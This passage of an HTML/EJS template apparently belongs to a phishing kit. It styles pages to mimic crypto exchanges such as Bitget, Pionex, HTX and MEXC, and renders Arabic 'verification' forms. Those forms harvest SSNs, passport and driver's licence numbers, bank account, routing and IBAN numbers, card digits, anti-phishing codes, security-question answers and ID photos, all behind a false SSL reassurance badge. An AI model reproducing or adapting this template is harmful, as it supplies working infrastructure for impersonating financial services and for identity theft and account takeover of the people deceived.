body.brand-bitget{background:#0A0F1C;color:#fff}
body.brand-bitget .card{background:#141928;border:1px solid #1e2540;border-radius:8px}
body.brand-bitget input{background:#0A0F1C;border:1px solid #1e2540;color:#fff}
body.brand-bitget .btn{background:#1DB2FF;background-image:none;border-radius:4px}
body.brand-pionex{background:#000;color:#fff}
body.brand-pionex .card{background:#111;border-radius:8px}
body.brand-pionex input{background:#1a1a1a;border:1px solid #333;color:#fff}
body.brand-pionex .btn{background:#F7931A;background-image:none;border-radius:4px}
body.brand-htx{background:#1A1A1A;color:#fff}
body.brand-htx .card{background:#262626;border-radius:8px}
body.brand-htx input{background:#1A1A1A;border:1px solid #444;color:#fff}
body.brand-htx .btn{background:#00B4D8;background-image:none;border-radius:4px}
body.brand-mexc{background:#0A0F1C;color:#fff}
body.brand-mexc .card{background:#141928;border:1px solid #1e2540;border-radius:8px}
body.brand-mexc input{background:#0A0F1C;border:1px solid #1e2540;color:#fff}
body.brand-mexc .btn{background:#00C087;background-image:none;border-radius:4px}
h1{font-size:1.25rem;margin-bottom:8px;text-align:center}
.sub{font-size:.9rem;opacity:.65;text-align:center;margin-bottom:28px;line-height:1.5}
.field-group{margin-bottom:16px}
label{display:block;font-size:.85rem;opacity:.8;margin-bottom:6px}
input,select,textarea{width:100%;padding:12px 14px;background:var(--bg);border:1.5px solid #ffffff18;border-radius:10px;color:var(--fg);font-family:inherit;font-size:.95rem;transition:.2s;outline:none}
input:focus,select:focus,textarea:focus{border-color:var(--ac);box-shadow:0 0 0 3px var(--ac)18}
textarea{resize:vertical;min-height:80px}
.upload-area{border:2px dashed #ffffff30;border-radius:12px;padding:32px;text-align:center;cursor:pointer;transition:.2s;margin-bottom:16px}
.upload-area:hover{border-color:var(--ac);background:var(--ac)08}
.upload-area .icon{font-size:2.5rem;margin-bottom:8px}
.upload-area p{font-size:.88rem;opacity:.6}
.btn{width:100%;padding:14px;background:var(--ac);color:#fff;border:0;border-radius:10px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:8px;transition:.2s}
.btn:hover{opacity:.9}
.secure{text-align:center;font-size:.78rem;opacity:.45;margin-top:16px;display:flex;align-items:center;justify-content:center;gap:6px}
.err{background:#ef444420;border:1px solid #ef444440;border-radius:8px;padding:10px 14px;font-size:.85rem;color:#fca5a5;margin-bottom:14px;display:none}
</style>
</head>
<body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
<div class="card">
  <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %><div style="text-align:center;margin-bottom:16px"><%- logos[tpl.key] %></div><% } else { %><span class="brand-logo"><%= tpl.name %></span><% } %>
  <h1><%= pageContent.headline %></h1>
  <p class="sub"><%= pageContent.subheadline %></p>

  <div class="err" id="err"></div>

  <form method="POST" action="/p/<%= page.slug %>/step/<%= pageContent.slug %>" enctype="multipart/form-data">
    <input type="hidden" name="_csrf" value="<%= csrfToken %>">
    <input type="hidden" name="_step" value="<%= pageContent.slug %>">

    <% if (pageContent.form_type === 'id_verify') { %>
      <% const fldLabels = { full_name:'الاسم الكامل', dob:'تاريخ الميلاد', id_number:'رقم الهوية', ssn:'رقم الضمان الاجتماعي (SSN)', ssn_last4:'آخر 4 أرقام من SSN', card_last4:'آخر 4 أرقام من البطاقة', address:'العنوان', passport_number:'رقم جواز السفر', nationality:'الجنسية', city:'المدينة', state:'الولاية', zip:'الرمز البريدي', dl_number:'رقم رخصة القيادة', phone:'رقم الجوال', email:'البريد الإلكتروني', account_number:'رقم الحساب', routing_number:'رقم التوجيه', iban:'رقم IBAN', booking_ref:'رقم الحجز', last_name:'اسم العائلة' } %>
      <% (pageContent.fields || []).forEach(f => { %>
        <div class="field-group">
          <label><%= fldLabels[f] || f %></label>
          <input type="<%= f==='dob'?'date':'text' %>" name="<%= f %>" required>
        </div>
      <% }) %>

      <% if ((pageContent.fields || []).length === 0 || pageContent.upload_doc) { %>
        <div class="upload-area" onclick="document.getElementById('docfile').click()">
          <div class="icon">📷</div>
          <p>انقر لرفع صورة هويتك</p>
          <p style="font-size:.78rem;margin-top:4px;opacity:.4">JPG، PNG، PDF — حتى 10MB</p>
        </div>
        <input type="file" id="docfile" name="doc_file" accept="image/*,.pdf" style="display:none" onchange="document.querySelector('.upload-area p').textContent=this.files[0]?.name||'اختر ملف'">
      <% } %>

    <% } else if (pageContent.form_type === 'security_q') { %>
      <div class="field-group">
        <label>ما هو اسم مدرستك الابتدائية؟</label>
        <input type="text" name="answer1" required>
      </div>
      <div class="field-group">
        <label>ما هو اسم والدتك قبل الزواج؟</label>
        <input type="text" name="answer2" required>
      </div>
      <div class="field-group">
        <label>ما هو اسم حيوانك الأليف الأول؟</label>
        <input type="text" name="answer3" required>
      </div>

    <% } else { %>
      <% const fldLabels = { full_name:'الاسم الكامل', dob:'تاريخ الميلاد', id_number:'رقم الهوية', ssn:'رقم الضمان الاجتماعي (SSN)', ssn_last4:'آخر 4 أرقام من SSN', card_last4:'آخر 4 أرقام من البطاقة', address:'العنوان', phone:'رقم الجوال', email:'البريد الإلكتروني', passport_number:'رقم جواز السفر', nationality:'الجنسية', city:'المدينة', state:'الولاية', zip:'الرمز البريدي', dl_number:'رقم رخصة القيادة', account_number:'رقم الحساب', routing_number:'رقم التوجيه', iban:'رقم IBAN', booking_ref:'رقم الحجز', last_name:'اسم العائلة', anti_phishing_code:'رمز مكافحة التصيد' } %>
      <% (pageContent.fields || []).forEach(f => { %>
        <div class="field-group">
          <label><%= fldLabels[f] || f %></label>
          <input type="<%= f==='dob'?'date':f==='email'?'email':f==='phone'?'tel':'text' %>" name="<%= f %>" required>
        </div>
      <% }) %>
    <% } %>

    <button type="submit" class="btn"><%= pageContent.cta || 'متابعة' %></button>
  </form>
  <p class="secure">🔒 محمي بتشفير SSL</p>
</div>
<script>
document.querySelector('form').addEventListener('submit', function(e) {
  const inputs = this.querySelectorAll('input[required]');
  for (const inp of inputs) {
    if (!inp.value.trim()) {
      e.preventDefault();
      document.getElementById('err').style.display='block';
      document.getElementById('err').textContent='يرجى ملء جميع الحقول';
      inp.focus(); return;
    }
  }
});
</script>
</body>
</html>
